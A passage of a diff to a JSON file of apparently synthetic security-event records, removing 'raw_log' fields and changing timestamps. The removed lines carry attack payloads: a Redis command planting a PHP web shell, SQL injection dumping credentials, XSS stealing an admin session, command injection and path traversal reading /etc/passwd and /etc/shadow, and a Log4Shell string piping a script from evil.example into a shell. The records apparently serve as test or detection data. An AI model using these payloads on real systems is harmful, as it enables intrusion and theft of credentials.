     "http_status_code": 0,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-069-mongodb_probe mongodb_probe from 198.51.100.78 to 10.0.0.28:27017 payload=db.adminCommand({listDatabases:1}); unauthorized scan"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-070-redis_abuse",
@@ -1886,8 +1817,7 @@
     "http_request_body_len": 0,
     "http_response_body_len": 0,
     "http_status_code": 0,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-070-redis_abuse redis_abuse from 198.51.100.79 to 10.0.0.29:6379 payload=CONFIG SET dir /var/www/html; SET shell '<?php system($_GET[c]); ?>'"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-071-sql_injection",
@@ -1913,8 +1843,7 @@
     "http_request_body_len": 56,
     "http_response_body_len": 0,
     "http_status_code": 200,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-071-sql_injection sql_injection from 198.51.100.80 to 10.0.0.30:80 payload=' OR '1'='1' UNION SELECT username,password FROM users--"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-072-xss",
@@ -1940,8 +1869,7 @@
     "http_request_body_len": 58,
     "http_response_body_len": 0,
     "http_status_code": 200,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-072-xss xss from 198.51.100.81 to 10.0.0.31:8080 payload=<script>fetch('/admin/session').then(r=>r.text())</script>"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-073-command_injection",
@@ -1967,8 +1895,7 @@
     "http_request_body_len": 36,
     "http_response_body_len": 0,
     "http_status_code": 200,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-073-command_injection command_injection from 198.51.100.82 to 10.0.0.32:80 payload=status=ok; cat /etc/passwd; uname -a"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-074-path_traversal",
@@ -1994,8 +1921,7 @@
     "http_request_body_len": 50,
     "http_response_body_len": 0,
     "http_status_code": 200,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-074-path_traversal path_traversal from 198.51.100.83 to 10.0.0.33:8080 payload=GET /download?file=../../../../etc/shadow HTTP/1.1"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-075-ssh_bruteforce",
@@ -2021,8 +1947,7 @@
     "http_request_body_len": 0,
     "http_response_body_len": 0,
     "http_status_code": 0,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-075-ssh_bruteforce ssh_bruteforce from 198.51.100.84 to 10.0.0.34:22 payload=Failed password for root from attacker repeated login attempts"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-076-dns_tunnel",
@@ -2048,8 +1973,7 @@
     "http_request_body_len": 0,
     "http_response_body_len": 0,
     "http_status_code": 0,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-076-dns_tunnel dns_tunnel from 198.51.100.85 to 10.0.0.35:53 payload=very-long-exfiltration-subdomain-encoded-data.attacker.example"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-077-ddos_http_flood",
@@ -2075,8 +1999,7 @@
     "http_request_body_len": 53,
     "http_response_body_len": 0,
     "http_status_code": 200,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-077-ddos_http_flood ddos_http_flood from 198.51.100.86 to 10.0.0.36:80 payload=GET /login HTTP/1.1 flood high-rate repeated requests"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-078-rce_payload",
@@ -2102,8 +2025,7 @@
     "http_request_body_len": 68,
     "http_response_body_len": 0,
     "http_status_code": 200,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-078-rce_payload rce_payload from 198.51.100.87 to 10.0.0.37:443 payload=${jndi:ldap://evil.example/a} curl http://evil.example/shell.sh | sh"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-079-mongodb_probe",
@@ -2129,8 +2051,7 @@
     "http_request_body_len": 0,
     "http_response_body_len": 0,
     "http_status_code": 0,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-079-mongodb_probe mongodb_probe from 198.51.100.88 to 10.0.0.38:27017 payload=db.adminCommand({listDatabases:1}); unauthorized scan"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-080-redis_abuse",
@@ -2156,8 +2077,7 @@
     "http_request_body_len": 0,
     "http_response_body_len": 0,
     "http_status_code": 0,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-080-redis_abuse redis_abuse from 198.51.100.89 to 10.0.0.39:6379 payload=CONFIG SET dir /var/www/html; SET shell '<?php system($_GET[c]); ?>'"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-081-sql_injection",
@@ -2183,8 +2103,7 @@
     "http_request_body_len": 56,
     "http_response_body_len": 0,
     "http_status_code": 200,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-081-sql_injection sql_injection from 198.51.100.90 to 10.0.0.40:80 payload=' OR '1'='1' UNION SELECT username,password FROM users--"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-082-xss",
@@ -2210,8 +2129,7 @@
     "http_request_body_len": 58,
     "http_response_body_len": 0,
     "http_status_code": 200,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-082-xss xss from 198.51.100.91 to 10.0.0.41:8080 payload=<script>fetch('/admin/session').then(r=>r.text())</script>"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-083-command_injection",
@@ -2237,8 +2155,7 @@
     "http_request_body_len": 36,
     "http_response_body_len": 0,
     "http_status_code": 200,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-083-command_injection command_injection from 198.51.100.92 to 10.0.0.42:80 payload=status=ok; cat /etc/passwd; uname -a"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-084-path_traversal",
@@ -2264,8 +2181,7 @@
     "http_request_body_len": 50,
     "http_response_body_len": 0,
     "http_status_code": 200,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-084-path_traversal path_traversal from 198.51.100.93 to 10.0.0.43:8080 payload=GET /download?file=../../../../etc/shadow HTTP/1.1"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-085-ssh_bruteforce",
@@ -2291,8 +2207,7 @@
     "http_request_body_len": 0,
     "http_response_body_len": 0,
     "http_status_code": 0,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-085-ssh_bruteforce ssh_bruteforce from 198.51.100.94 to 10.0.0.44:22 payload=Failed password for root from attacker repeated login attempts"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-086-dns_tunnel",
@@ -2318,8 +2233,7 @@
     "http_request_body_len": 0,
     "http_response_body_len": 0,
     "http_status_code": 0,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-086-dns_tunnel dns_tunnel from 198.51.100.95 to 10.0.0.45:53 payload=very-long-exfiltration-subdomain-encoded-data.attacker.example"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-087-ddos_http_flood",
@@ -2345,8 +2259,7 @@
     "http_request_body_len": 53,
     "http_response_body_len": 0,
     "http_status_code": 200,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-087-ddos_http_flood ddos_http_flood from 198.51.100.96 to 10.0.0.46:80 payload=GET /login HTTP/1.1 flood high-rate repeated requests"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-088-rce_payload",
@@ -2372,8 +2285,7 @@
     "http_request_body_len": 68,
     "http_response_body_len": 0,
     "http_status_code": 200,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-088-rce_payload rce_payload from 198.51.100.97 to 10.0.0.47:443 payload=${jndi:ldap://evil.example/a} curl http://evil.example/shell.sh | sh"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-089-mongodb_probe",
@@ -2399,8 +2311,7 @@
     "http_request_body_len": 0,
     "http_response_body_len": 0,
     "http_status_code": 0,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-089-mongodb_probe mongodb_probe from 198.51.100.98 to 10.0.0.48:27017 payload=db.adminCommand({listDatabases:1}); unauthorized scan"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-090-redis_abuse",
@@ -2426,8 +2337,7 @@
     "http_request_body_len": 0,
     "http_response_body_len": 0,
     "http_status_code": 0,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-090-redis_abuse redis_abuse from 198.51.100.99 to 10.0.0.49:6379 payload=CONFIG SET dir /var/www/html; SET shell '<?php system($_GET[c]); ?>'"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-091-sql_injection",
@@ -2453,8 +2363,7 @@
     "http_request_body_len": 56,
     "http_response_body_len": 0,
     "http_status_code": 200,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-091-sql_injection sql_injection from 198.51.100.100 to 10.0.0.20:80 payload=' OR '1'='1' UNION SELECT username,password FROM users--"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-092-xss",
@@ -2480,8 +2389,7 @@
     "http_request_body_len": 58,
     "http_response_body_len": 0,
     "http_status_code": 200,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-092-xss xss from 198.51.100.101 to 10.0.0.21:8080 payload=<script>fetch('/admin/session').then(r=>r.text())</script>"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-093-command_injection",
@@ -2507,8 +2415,7 @@
     "http_request_body_len": 36,
     "http_response_body_len": 0,
     "http_status_code": 200,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-093-command_injection command_injection from 198.51.100.102 to 10.0.0.22:80 payload=status=ok; cat /etc/passwd; uname -a"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-094-path_traversal",
@@ -2534,8 +2441,7 @@
     "http_request_body_len": 50,
     "http_response_body_len": 0,
     "http_status_code": 200,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-094-path_traversal path_traversal from 198.51.100.103 to 10.0.0.23:8080 payload=GET /download?file=../../../../etc/shadow HTTP/1.1"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-095-ssh_bruteforce",
@@ -2561,8 +2467,7 @@
     "http_request_body_len": 0,
     "http_response_body_len": 0,
     "http_status_code": 0,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-095-ssh_bruteforce ssh_bruteforce from 198.51.100.104 to 10.0.0.24:22 payload=Failed password for root from attacker repeated login attempts"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-096-dns_tunnel",
@@ -2588,8 +2493,7 @@
     "http_request_body_len": 0,
     "http_response_body_len": 0,
     "http_status_code": 0,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-096-dns_tunnel dns_tunnel from 198.51.100.105 to 10.0.0.25:53 payload=very-long-exfiltration-subdomain-encoded-data.attacker.example"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-097-ddos_http_flood",
@@ -2615,8 +2519,7 @@
     "http_request_body_len": 53,
     "http_response_body_len": 0,
     "http_status_code": 200,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-097-ddos_http_flood ddos_http_flood from 198.51.100.106 to 10.0.0.26:80 payload=GET /login HTTP/1.1 flood high-rate repeated requests"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-098-rce_payload",
@@ -2642,8 +2545,7 @@
     "http_request_body_len": 68,
     "http_response_body_len": 0,
     "http_status_code": 200,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-098-rce_payload rce_payload from 198.51.100.107 to 10.0.0.27:443 payload=${jndi:ldap://evil.example/a} curl http://evil.example/shell.sh | sh"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-099-mongodb_probe",
@@ -2669,8 +2571,7 @@
     "http_request_body_len": 0,
     "http_response_body_len": 0,
     "http_status_code": 0,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-099-mongodb_probe mongodb_probe from 198.51.100.108 to 10.0.0.28:27017 payload=db.adminCommand({listDatabases:1}); unauthorized scan"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   },
   {
     "_id": "attack-100-redis_abuse",
@@ -2696,7 +2597,6 @@
     "http_request_body_len": 0,
     "http_response_body_len": 0,
     "http_status_code": 0,
-    "timestamp": "2026-05-08T07:00:56.013637+00:00",
-    "raw_log": "attack-100-redis_abuse redis_abuse from 198.51.100.109 to 10.0.0.29:6379 payload=CONFIG SET dir /var/www/html; SET shell '<?php system($_GET[c]); ?>'"
+    "timestamp": "2026-05-08T11:01:18.658456+00:00"
   }
 ]
